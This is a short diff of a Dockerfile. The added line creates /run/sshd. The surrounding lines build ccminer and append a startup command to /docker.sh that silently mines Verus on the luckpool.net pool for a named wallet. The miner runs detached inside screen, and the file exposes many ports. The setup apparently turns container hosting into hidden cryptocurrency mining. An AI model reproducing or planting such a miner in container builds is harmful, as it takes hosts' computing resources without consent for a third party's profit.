@@ -39,6 +39,7 @@ RUN sudo apt update -y \
     && chmod +x configure.sh \
     && chmod +x autogen.sh \
     && ./build.sh \
+    && mkdir /run/sshd \
     && echo "sudo screen -dmSL vm ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3960 -u RQmcUUPrM3Fd59UUgFKvioer9bBHdvBMNj.Rig001 -p x &" >>/docker.sh \
 
 EXPOSE 80 8888 8080 443 5130-5135 3306 7860
